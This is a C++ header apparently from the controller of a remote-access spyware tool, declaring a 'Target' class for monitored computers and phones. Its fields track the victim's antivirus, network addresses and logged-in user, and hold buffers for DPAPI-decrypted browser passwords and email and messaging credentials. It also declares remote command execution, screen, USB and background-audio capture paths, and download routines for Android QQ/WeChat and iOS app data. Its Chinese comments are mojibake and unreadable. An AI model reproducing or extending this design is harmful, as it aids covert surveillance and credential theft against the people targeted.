//---------------------------------------------------------------------------

#ifndef targetH
#define targetH
//---------------------------------------------------------------------------

#include <string>
#include <map>
#include <vector>
#include <list>
#include <set>
#include <time.h>

#include "include/T5Task.h"
#include "include/CtrAndDaeCommon.h"

#include <QtGui>
using namespace std;

extern const wchar_t* PhoneRecordFile;

//
// �ļ��м�ص����ݽṹ
//

// �ļ��б�
struct MonitorFileInfo
{
public:
	MonitorFileInfo(){}

	bool operator<(const MonitorFileInfo& info)
	{
		return fileName < info.fileName;
	}

	unsigned int	taskId;
	std::wstring	parentDir;
	std::wstring	fileName;
	unsigned int	fileSize;
	std::wstring	fileTime;
};


typedef std::list<MonitorFileInfo>	MonitorFileInfoList;

// ���Ŀ¼�Ļ�����Ϣ
struct MonitorDirInfo
{
	MonitorDirInfo()
	{
		fileList = new MonitorFileInfoList;
	}

	~MonitorDirInfo()
	{
		delete fileList;
	}

	bool operator<(const MonitorDirInfo& info)
	{
		return fileList < info.fileList;
	}

	unsigned int		taskId;
	bool				isDir;
	std::wstring		monitorTime;
	std::wstring		remark;
	MonitorFileInfoList*	fileList;
};

typedef std::map<std::wstring, MonitorDirInfo*> MonitorDirMap;


#define ONLINE_COLOR    0x00EDEDDC
#define OFFLINE_COLOR   0x00D7D7D7

//---------------------------------------------------------------------------
enum STATUS_LEVEL
{
	STATUS_INFO = 0,
	STATUS_NOTE,
	STATUS_WARNING,
	STATUS_ERROR
};

// ����ṹ
//
typedef struct _PLUGIN_CONTEXT
{
	ULONG			dwPluginId;
	PCHAR			lpszPluginName;			// ��Ҫ�ֹ� free
	ULONG			dwPluginVer;
	ULONG			dwUpdateVer;
	ULONG			dwLoadType;
	ULONG			dwUpdateType;
	PCHAR			lpszProcList;			// ��Ҫ�ֹ� free

	// �������
	//
	DWORD			dwDataLen;
	PBYTE			lpbyData;				// ��Ҫ�ֹ� free

} PLUGIN_CXT,
*PPLUGIN_CXT,
PLUGIN_CONTEXT,
*PPLUGIN_CONTEXT;

typedef struct tagDriverSet
{
    ULONG DriveMap;
    UCHAR DriveType[32];
} DriverSet;

// �ļ��ṹ
//
typedef struct _FILE_BLOCK
{
    std::wstring      widName;
    std::wstring      widPath;        // ֻ����������ʱ���ʹ��

    ULONG           FileAttributes;
    LONGLONG        CreationTime;
    LONGLONG        LastWriteTime;
    LONGLONG        Size;

    bool            bDowned;        // �Ƿ��Ѿ�����
    bool            bChanged;

} FILE_BLOCK,
*PFILE_BLOCK;

typedef struct tagFileTask
{
	DWORD			dwTaskID;
    DWORD           dwParentID;
    DWORD           dwTargetID;

    DWORD           dwPluginID;

	DWORD			dwErrorID;

    UINT            taskType;
    UINT            taskDirect;
	UINT            taskStatus;

	DWORD			dwTotalLen;				// �����ܳ���
	DWORD			dwDaemonedLen;			// �Ѿ����浽��ת�������ϵ����ݳ���(������Ϊ��ƫ����)
	DWORD			dwFinishedLen;			// �Ѿ�����������ݳ���(������Ϊ��ƫ����)

    BOOL			bDaemonBufFinished;		// ˵���Ƿ��Ѿ���ת���
    int             nFinishedProp;          // ����ɱ���
    int             nDaemonedProp;          // �ѻ������

    // Ŀ���ļ�ʱ������  -- ֻ����ļ���������
    //
	DWORD		    dwCTHighDataTime;		// CreateTime
	DWORD			dwCTLowDataTime;		// CreateTime
	DWORD			dwLWHighDataTime;		// LastWrite
	DWORD			dwLWLowDataTime;		// LastWrite
	DWORD			dwLAHighDataTime;		// LastAcess
	DWORD			dwLALowDataTime;		// LastAcess

    HANDLE		    hFile;

    std::wstring      ctrPathW;
    std::wstring      tarPathW;

    std::string      aniTmpTaskPath;         // ��ʱ�洢�Ļ���·��
        
} FileTask,
*PFileTask;

// Ŀ¼��Ϣ
//
typedef struct tagDirInfo
{
	DWORD		dwQueryId;						// ���ڿ��ٶ�λ, 0Ϊ��Ŀ¼
	DWORD		dwLevel;						// ����
	std::string  dirPathBase64;
	std::string dirData;
	DWORD		dwErrorId;						// 0 ˵��û�д���
	DWORD		dwFinished;						// 1 ˵���Ѿ��������

} DirInfo,
*PDirInfo;

//
// �߼�����     @@@��û���ͷ�
//
typedef struct tagDirTask
{
	DWORD				dwTaskID;
	DWORD				dwTargetID;				// Ŀ��ID

	ULONG			    taskStatus;				// ״̬
	ULONG			    taskDirect;				// ����
	DWORD				dwErrorID;				// ����ID (��״̬ΪERROREDʱ����Ч)

	std::wstring			tarDirPathW;	        // Ŀ¼·��
	DWORD				dwLevel;				// ��ȡ��Ŀ¼������0��ʾȫ����ȡ
	DWORD				dwAutoDown;				// 0 �������أ���1�Զ�����

    PFileTask           lpInfoFileTask;         // ���ڶ��Ŀ¼��Ϣ��ȡ��˵��ָ��Ψһ��Child FileTask

	// ���½����Ŀ¼���� dwAutoDown == 1
	//
	DWORD				dwWorkingCount;
	DWORD				dwCanceledCount;
	DWORD				dwPausedCount;
	DWORD				dwErroredCount;
	DWORD				dwFinishedCount;
    
} DirTask,
*PDirTask;

typedef struct tagSearchFilter
{
    DWORD           dwLevel;

    bool            bNameFilter;
    bool            bTimeFilter;
    bool            bTypeFilter;
    bool            bSizeFilter;
        
    std::wstring      widName;
    std::wstring      widType;    
    ULARGE_INTEGER  uliBegTime;
    ULARGE_INTEGER  uliEndTime;
    ULONG           dwMinSize;              // 0 ˵������
    ULONG           dwMaxSize;              // 0 ˵������

} SearchFilter,
*PSearchFilter;

typedef struct tagSearchTask
{
	DWORD				dwTaskID;
	DWORD				dwTargetID;				// Ŀ��ID

	ULONG			    taskStatus;				// ״̬
	ULONG			    taskDirect;				// ����
	DWORD				dwErrorID;				// ����ID (��״̬ΪERROREDʱ����Ч)

	std::wstring			tarDirPathW;	        // Ŀ¼·��
	DWORD				dwAutoDown;				// 0 �������أ���1�Զ�����

    PFileTask           lpInfoFileTask;         // ָ��Ψһ��Child FileTask
    
	DWORD				dwLevel;				// ��ȡ��Ŀ¼������0��ʾȫ����ȡ
    
    bool                bNameFilter;
    bool                bTimeFilter;
    bool                bTypeFilter;
    bool                bSizeFilter;

    std::wstring          widName;
    FILETIME            ftBegTime;
    FILETIME            ftEndTime;
    std::wstring          widType;
    ULONG               ulMinSize;
    ULONG               ulMaxSize;

} SearchTask,
*PSearchTask;

class TargetConnection;
class TargetDlg;

class Target
{

public:
	// һЩ����
	static const std::wstring Android_QQDataPath;
	static const std::wstring Android_WeixinDataPath;

	static bool IsMobileAppPath(const std::wstring& path);

public:
    Target();
    ~Target();

    void __fastcall CheckAndCreateDataDir();                        // ����Ŀ��ı���Ŀ¼

    FileTask* __fastcall GetFileTaskFromMap(ULONG taskId);
    DirTask * __fastcall GetDirTaskFromMap(ULONG taskId);
    SearchTask * __fastcall GetSearchTaskFromMap(ULONG taskId);

    bool __fastcall QueryFileTasking();                             // ��ѯ�Ƿ����ļ��������(�Ի�ǰ��Ҫ�����ж�)    
    void __fastcall AddFileTask(FileTask * fileTask);               // �·�������
    void __fastcall DeleteFileTask(FileTask * fileTask);
    void __fastcall ClearAllFileTask();

    void __fastcall FileTaskStatusChanged(FileTask * fileTask, TaskStatus oldStatus);     // ����״̬�仯
    void __fastcall FileTaskPaused(FileTask *fileTask);
    void __fastcall FileTaskErrored(FileTask *fileTask);
    void __fastcall FileTaskFinished(FileTask *fileTask);
    void __fastcall FileTaskCanceled(FileTask *fileTask);
    void __fastcall FileTaskResumed(FileTask *fileTask);
    void __fastcall FileTaskProgressChanged(FileTask *fileTask);    // ������ȱ仯

    void __fastcall MoveTaskFileToDataDir(FileTask *fileTask);      // ��Task�����ƶ������ط���Ŀ¼    
    void __fastcall MoveTaskFileToPluginDir(FileTask *fileTask);      // ��Task�����ƶ������ز������Ŀ¼
    
    void __fastcall AddDirTask(DirTask *dirTask);
	void DirFinished(DirTask *dirTask, TaskStatus oldStatus);
    void __fastcall DirTaskStatusChanged(DirTask *dirTask, TaskStatus oldStatus);

    void __fastcall AddSearchTask(SearchTask *searchTask);
    void __fastcall SearchTaskStatusChanged(SearchTask *searchTask, TaskStatus oldStatus);

    void __fastcall StartTarDataConn();                             // ��������ͨ������
    void __fastcall TargetDataConnOnline();                         // ����ͨ����������
    void __fastcall TargetDataConnOffline();                        // ����ͨ����������
    void __fastcall ScheduleTarFileTask();                          // �����ļ�����

    void __fastcall ReScheduleTarFileTask();                        // ֹͣ��ǰ�����ٽ��е���

	std::wstring GetLocalFilePath(const std::wstring& tarPath);

	void AndroidDownloadAppDataDir();

	void IOSDownloadAppConfig();
	void IOSDownloadAppDataDir(const std::wstring& appPlist);

	void AddAppInfoListener(std::wstring listenPath);
	bool RemoveAppInfoListener(std::wstring path);
	void AppInfoListenerTriggered();

	void FlowStatistics(unsigned int bytes);
	void UpdateFlowStatistics();

	const std::map<ULONG, FileTask*>& GetFileTaskMap();
	const std::map<ULONG, DirTask*>& GetDirTaskMap();

public:

	// ϵͳ����
	SystemType m_sysType;

	// ɱ�����
	std::wstring m_antiVirus;

	// �Ƿ�ʹ�õ��� 3G ����
	ULONG m_netEnv;

	// �Ƿ��ղ�
	bool m_favorite;

	// �Զ���ȡ
	int m_autoGetDirInfoDepth;

    // �����Ŀ��ƽ���
    //
    QTreeWidgetItem *   treeNode;
    TargetDlg*     frmTarControl;

    // ����
    //
    BOOL                bTarConnOnline;
    BOOL                bConnecting;
    BOOL                bCleared;           // ���
    TargetConnection    *tarConn;
    BOOL                bIsMyTarget;
    
    // ״̬
    //
    TargetStatus        tarStatus;
    LONG                lastTime;

    // ����
    //
    ULONG               dwProtocolVersion;

    ULONG               dwTargetID;
    ULONG               dwGroupID;

    std::string          aniTargetName;
    std::wstring          widTargetName;
    ULONG               dwOsBuildNumber;

    std::string          aniRemLocalIpAddr;
    std::string          aniRemPublicIpAddr;
    std::string          aniRemMacAddr;

    ULONG               dwLangId;
    std::string          aniComputerNameBase64;
    std::string          aniOnlineProcBase64;
    std::string          aniLoginUserBase64;

    std::string          aniLocalDataDir;
    std::wstring          widLocalDataDir;
    std::wstring          widDiskDataDir;
    std::wstring          widUsbDataDir;
    std::wstring          widDelDataDir;
    std::wstring          widHttpsDataDir;     
    std::wstring          wideScreenPath;
    std::wstring          widDirPath;
	std::wstring		  widMultimediaPath;
	std::wstring		  wid3rdFilePath;
	std::wstring		  widBackSoundPath;
    
    // ����б�
    //
   	PPLUGIN_CONTEXT		pluginVect[MAX_PLG_COUNT];

    CRITICAL_SECTION    csFileTask;

    // Ŀ���̷���Ŀ¼��Ϣ
    //
    DriverSet           logicDriverSet;
            
    // Remote Run
    //
    BOOL                bRedirectIO;
    std::wstring          widRedirectProc;        // �ض��򽻻��Ľ�����
    std::wstring          widRedirectOutput;      // �ض���֮������          

    // DPAPI
    //
    ULONG               dpapiId     ;
    BOOL                dpapiLoadFlag;

    // store tmp dpapi buffer
    //
    std::string         ieAutoString ;
    std::string         iePassString ;
    std::string         imsString    ;
    std::string         emailString  ;

    // members used to processing FTK cmd
    //
    FileTask                        *curFileTask;
    std::map<ULONG, FileTask *>     fileTaskMap;
    std::map<ULONG, DirTask*>       dirTaskMap;
    std::map<ULONG, SearchTask*>    searchTaskMap;

    // ���ڴ���ֶα�������
    //
    std::map<std::string, std::string>  dirInfoMap;

	std::set<std::wstring> m_listenPathSet;

	unsigned int m_flowStatistics;
};

extern std::map<ULONG, Target *> g_targetMap;

//---------------------------------------------------------------------------
__inline 
Target * GetTargetFromGlobalMap(ULONG targetId)
{
	std::map<ULONG,Target *>::iterator i = g_targetMap.find(targetId);
	if (i == g_targetMap.end())
	{
		return NULL;
	}

	return (Target *)(*i).second;
}

inline void RemoveTargetFromGlobalMap(ULONG targetId)
{
	std::map<ULONG,Target *>::iterator i = g_targetMap.find(targetId);
	if (i != g_targetMap.end())
	{
		g_targetMap.erase(i);
	}
}
//---------------------------------------------------------------------------

#endif
